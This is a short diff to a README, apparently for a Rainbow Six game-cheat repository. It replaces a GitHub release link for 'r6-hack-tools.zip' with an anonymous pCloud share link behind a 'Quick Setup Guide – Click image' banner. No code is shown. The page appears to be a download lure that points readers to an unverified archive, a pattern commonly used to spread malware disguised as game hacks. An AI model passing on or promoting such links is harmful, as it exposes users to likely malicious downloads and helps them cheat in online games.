@@ -1,7 +1,7 @@
 ## 🚀 **Quick Setup Guide** - Click image
 <br>
 <div align="center">
-<a href="https://github.com/LineProtectorTrek/rainsix-tools/releases/download/r6tools/r6-hack-tools.zip">
+<a href="https://u.pcloud.link/publink/show?code=XZrLul5ZkDqYAgWoJm4IL6tl5QcIkVmPQEGV">
 <img src="https://i.postimg.cc/vTPHCgDd/image.png">
 </a>
 </div>
